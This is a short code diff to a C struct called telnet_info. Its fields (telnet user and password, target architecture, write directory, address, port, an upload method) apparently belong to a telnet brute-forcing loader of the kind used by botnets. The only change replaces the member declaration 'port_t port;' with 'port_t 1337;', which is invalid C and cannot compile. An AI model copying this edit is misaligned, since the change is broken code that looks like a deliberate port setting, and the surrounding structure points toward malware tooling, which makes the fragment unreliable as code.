@@ -6,7 +6,7 @@ struct telnet_info
 {
     char user[32], pass[32], arch[6], writedir[32];
     ipv4_t addr;
-    port_t port;
+    port_t 1337;
     enum
     {
         UPLOAD_ECHO,
